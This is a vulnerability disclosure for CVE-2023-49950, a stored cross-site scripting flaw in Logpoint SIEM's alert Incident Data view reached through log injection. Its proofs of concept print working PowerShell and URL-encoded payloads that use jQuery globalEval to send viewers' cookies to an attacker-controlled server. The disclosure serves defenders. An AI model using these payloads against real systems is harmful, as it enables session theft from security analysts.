# CVE-2023-49950: A Stored XSS in Logpoint SIEM Alerts via Log Injection

## Details

| Detail | Description |
| -- | -- |
| CVSSv3.1 Vector | [AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N&version=3.1)
| CVSSv 3.1 Base Score | 5.4 |
| Severity | Medium |
| CWE | CWE-79, CWE-20 |

### Timeline
| Detail | Date |
| -- | -- |
| Initial Discovery | 2023-06-15 |
| Vendor Alerted | 2023-06-16 |
| Vendor Acknowledged | 2023-06-16 |
| Vendor Fix Release (Internal) | 2023-10-12 |
| Vendor Fix Release (Public) | 2024-01-29 |
| Vendor Security Article Published (Internal) | 2023-10-12 |
| Vendor Security Article Published (Public) | 2024-01-29 |


## Summary
Due to insufficient sanitization in the Jinja templating present in Logpoint SIEM, a custom Jinja template (including the default one provided by Logpoint) is susceptible to a stored cross-site scripting attack via log injection. If an alert is generated by Logpoint with the malicious payload present, and a user of the Logpoint system views the Alert Incident Data which uses the template mentioned, the payload will execute in the context of the user viewing it.

This vulnerability affects Logpoint SIEM v6.1.0 -> Logpoint SIEM v7.2.4.

*Note: This report has been re-written from the original vulnerability submission due to the inclusion of sensitive information. As such, the included screenshots will be blurred where appropriate.*

## Breakdown

### The Vulnerability

An attacker can inject arbitrary HTML code into the Logpoint Web UI through the use of specially crafted payloads from any system that will generate a log on the Logpoint SIEM.

This vulnerability exploits the ‘Incident Data’ view option, which relies on the Jinja templating engine to render HTML into the Web UI when an incident is created.

A user of the Web UI (such as a SOC Analyst) who clicks on the ‘Incident Data’ button will cause any arbitrary HTML code contained within the payload to be injected into the displayed pop-up window and subsequently execute any embedded JavaScript. 

This exploit is only possible because of a combination of factors:
1. The jQuery JavaScript library is used by the Web UI and loaded by default.
2. The Content Security Policy (CSP) is insufficiently configured, allowing unsafe scripts to be executed.
3. The Jinja2 templating engine is used by the Web UI to display incident data with templates.
4. Raw logs are normalized into common fields, which are used by the aforementioned templates.



#### Content Security Policy Weakness

The Content Security Policy (CSP) of the Web UI has the following parameters embedded within all requests via the headers:

```js
default-src 'self';
child-src 'self' blob:;
script-src 'self' 'unsafe-inline' 'unsafe-eval';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:;
report-uri /content_policy_violation;
font-src 'self' 'unsafe-inline' data:;
worker-src blob:
```

This CSP helps to ensure that the sources of various content across the Web UI are protected from cross-site scripting (XSS). Unfortunately, due to the inclusion of the above `script-src` configuration, the protection that the CSP provides is limited in nature.

This configuration allows in-line scripts to be executed and evaluated. This is somewhat mitigated by the use of HTML tag filtering/stripping, but `jQuery` does not rely on `<script>` tags to execute JavaScript, and thus bypasses this measure.

#### jQuery `globalEval()`

`$.globalEval()` allows the attacker to execute the subsequent code in a 'global' context, utilising Unicode characters to avoid some of the filtering (e.g., replacing `'` with `&apos;`, `"` with `&quot;`, etc).

#### Jinja Templates

By crafting a payload using non `<script>` tags, you can inject HTML tags into the data that will be rendered by Jinja templates when using the 'Incident Data' view.

This relies on an alert rule to have been configured for the field that would contain the payload and that a Jinja template is used. However, by default, all Logpoint and Vendor alert rules make use of a standard template that displays a number of fields based on the type of incident they create. As long as one of these fields displays user input, it can be exploited.

#### Normalized Logs

As the Jinja templates rely on the normalized logs that Logpoint creates, this defines the vulnerability as stored XSS; the logs are stored within the backend database and alert templates can be changed _after_ the incidents have been created. This means that any pre-existing incidents can also trigger the exploit, should the template happen to be modified to display the affected field.

### Exploitation

A very basic demonstration of the stored XSS can be seen below:

![ProofOfConcept-QuickTestPayload](https://github.com/shrikeinfosec/cve-2023-49950/assets/5949532/1f10e14b-7ad6-4268-8032-ec8c2d42ac71)

![ProofOfConcept-QuickTestResult](https://github.com/shrikeinfosec/cve-2023-49950/assets/5949532/8fd4b3a0-e66d-45e6-8041-03d305ed5530)

Below are two separate _detailed_ 'Proof of Concepts', demonstrating a few ways this can be exploited; one with access to a machine inside the organization, and one with an attacker using their own mobile device whilst connected to the network.

**Note**: This exploit does not necessarily require access to the network to exploit; this is just being used for demonstration purposes. In theory, this could be exploited by anybody - as long as user-submitted input is included in a normalized log field somewhere, this vulnerability can be abused, even from external sources such as Microsoft 365.

#### PoC 1 - Attacker has access to a machine on the network.

In this proof of concept, I have access to a Windows-based machine on the network that sends logs to Logpoint via the Logpoint Agent. 

To verify the exploit, I set up a simple web-server using Python on another machine, which is at `http://10.10.100.5:9999`:

```bash
python3 -m "http.server" 9999
```

To initiate the attack, I ran the following command on a PowerShell window:

```powershell
powershell.exe -c 'Write-Host "EXAMPLE <b>JQUERYEVAL 5</b>
<img src =q onerror=$.globalEval(&quot;window.location.href=&apos
http&#x3a;//10.10.100.5&#x3a;9999?c=&apos;+document.cookie&quot;)><td>"'
```


This payload makes use of the system logging to Event Viewer as a security event and **does not require the command to be successful, only that the input is logged to the SIEM**.

![ProofOfConcept1-NormalizedField](https://github.com/shrikeinfosec/cve-2023-49950/assets/5949532/b1c9b1e1-b9cc-4f82-907f-5b2cda0ab0b8)

On the Web UI, I have an alert rule that creates an incident whenever a PowerShell command is run on any of our Windows-based machines. The `commandline` field is displayed as part of the alert template that was configured using the standard Jinja template from Logpoint as reference.

**Alert Rule Template (excluding styling)**
```html
<table class="alert-table" cellpadding="0" cellspacing="0">
	<tbody>
    <tr>
		<th width="200" class="alert-table-th">TIME</th>
		<th width="200" class="alert-table-th">COMMAND</th>
	</tr>
	{% for row in rows %}
        <tr>
			<td class="alert-table-td" width="200">{{row.log_ts|datetime}}</td>
			<td class="alert-table-td" width="200">{{row.command}}</td>
		</tr>
    {% endfor %}
    </tbody>
</table>
```

Once the incident is created, I click on the 'Incident Data' button and my browser is immediately re-directed to my web-server which is accessible at `http://10.10.100.5:9999`.

![ProofOfConcept1-WebServerCookie](https://github.com/shrikeinfosec/cve-2023-49950/assets/5949532/82eb00e6-6509-4074-aee0-e089b9f67472)

![ProofOfConcept1-WebServerRequest](https://github.com/shrikeinfosec/cve-2023-49950/assets/5949532/82c5e7cb-b468-4b1d-a90a-340bbaeae6f0)

#### Payload Explanation

This payload exploits the use of the `onerror=` parameter of the `img` tag, and leverages the included `jQuery` library from the Web UI to execute an in-line script which will redirect the victim's browser tab to the attacker's web server, and attach their cookie as part of the request.

The use of `jQuery` means that any filtering being done against the HTML input is ignored (such as removing the `>'"` characters from inputs to prevent `<script>` tags).

This payload will **automatically** redirect the current window to whatever address the attacker wants as soon as the template is viewed.

_A video has been attached, demonstrating this particular proof of concept. Please see 'ProofOfConcept1-PowerShell.mp4'._

#### PoC 2 - User has no access to device, but does have access to network (such as Wi-Fi).

In this 'proof of concept', I am making use of a mobile device using the Brave browser.

To verify the exploit, I set up a simple web-server using Python on another machine, which is at `http://10.10.100.5:9999`:

```bash
shrike@10.10.100.5:~/xss$ python3 -m "http.server" 9999
```

I repeated the same steps on my VPS to host a simple HTTP server:

```bash
shrike@attackbox:~/xss$ python3 -m "http.server" 9999
```

To perform the exploit, I can use a payload designed to be sent as part of an HTTP request which will be logged by the firewall and navigate my browser to the following address:

**Crafted URL**
```
http://<attackbox_ip>:9999/%22PWNED%22%3Cimg%5Csrc%5C%3Dq%5Conerror%3D%24%2E
globalEval%28%26quot%3Bwindow%2Elocation%2Ehref%3D%26apos%3B
http%26%23x3a%3B%2F%2F192%2E168%2E101%2E75%26%23x3a%3B9999
%3Fc%3D%26apos%3B%2Bdocument%2Ecookie%26quot%3B%29%3E
```

In this case, the request being sent is to a server I have control of. The logged request does not need to be directed to the organisation in *any way*, which may make it more difficult to pick up on.

![ProofOfConcept2-MobileBrowser](https://github.com/shrikeinfosec/cve-2023-49950/assets/5949532/a3c4136f-4041-49db-9a2a-09cc78b8bd72)

After submitting the above request, the unescaped/URL-decoded payload will be normalized by Logpoint from the raw firewall log into the `url_path` field. As in the previous proof of concept, I have created an alert rule that creates an incident that looks for a `url_path` to be included in a HTTP request logged by the firewall.

![ProofofConcept2-NormalizedField](https://github.com/shrikeinfosec/cve-2023-49950/assets/5949532/4c75ef92-08bb-4049-98d9-6c8e8395c2a0)

The `url_path` field is displayed as part of the alert template that was configured using the standard Jinja template from Logpoint as reference.

**Alert Rule Template (excluding styling)**
```html
<table class="alert-table" cellpadding="0" cellspacing="0">
	<tbody>
    <tr>
		<th width="200" class="alert-table-th">TIME</th>
		<th width="200" class="alert-table-th">PATH</th>
	</tr>
	{% for row in rows %}
        <tr>
			<td class="alert-table-td" width="200">{{row.log_ts|datetime}}</td>
			<td class="alert-table-td" width="200">{{row.url_path}}</td>
		</tr>
    {% endfor %}
    </tbody>
</table>
```

Once the incident is created, I click on the 'Incident Data' button and my browser is immediately re-directed to my web-server which is accessible at `http://10.10.100.5:9999`.

#### Payload Explanation

This payload also exploits the use of the `onerror=` parameter of the `img` tag, and leverages the included `jQuery` library from the Web UI. This payload also requires the use of URL encoding (including special characters) to ensure that the output is correctly processed and normalized.

**Encoded Payload**
```powershell
%22PWNED%22%3Cimg%5Csrc%5C%3Dq%5Conerror%3D%24%2E
globalEval%28%26quot%3Bwindow%2Elocation%2Ehref%3D%26apos%3B
http%26%23x3a%3B%2F%2F192%2E168%2E101%2E75%26%23x3a%3B9999
%3Fc%3D%26apos%3B%2Bdocument%2Ecookie%26quot%3B%29%3E
```

**Decoded Payload**
```powershell
"PWNED"<img\src\=q\onerror=
$.globalEval(&quot;window.location.href=&apos;
http&#x3a;//10.10.100.5&#x3a;9999?c=&apos;+document.cookie&quot;)>
```

This payload will **automatically** redirect the current window to whatever address the attacker wants as soon as the template is viewed.

The `<img\src\=q\onerror` portion of this payload bypasses the HTML tag filtering/stripping and instead becomes `<img src ="q" onerror=` (therefore becoming a full HTML tag).

#### Escaping the pop-up Window

**Note**: The HTML tags that are injected can be rendered *outside* of the Incident Data window in the top level of the DOM and be displayed even when the Incident Data window has been closed.

**Example Payload**
```powershell
powershell.exe -c 'Write-Host "EXAMPLE <b>JQUERY APPEND 3</b><img src =q 
onerror=$(document.body).append(&quot;hello&quot;)><td>"'
```

![DOMAppend](https://github.com/shrikeinfosec/cve-2023-49950/assets/5949532/519e80d7-90dd-4b12-afd8-392bf117e759)

### Conclusion

As has been demonstrated, this particular combination of issues can lead to a number of problems, including arbitrary JavaScript execution and HTML tag injection.

Whilst limited in scope, the ability to inject HTML and JavaScript remotely without requiring access to any machine or network in the organization makes this a significant vulnerability.

Given enough time and resources, an attacker could craft a more complex and dangerous payload that may bypass some of the existing restrictions to further make use of data stored within the browser.

Below are some examples of the outcomes that _could_ occur using the above proof of concepts:

- Cookie theft
- LocalStorage theft
- Drive-by download
- Phishing via fake login page

Logpoint are advising customers to upgrade to v7.3.0 and then immediately upgrade to v7.3.1 to ensure your environments are sufficiently secured.

# References

[Logpoint Product Security Article](https://servicedesk.logpoint.com/hc/en-us/articles/14124495377437-Stored-XSS-Vulnerability-in-Alerts-via-Log-Injection)
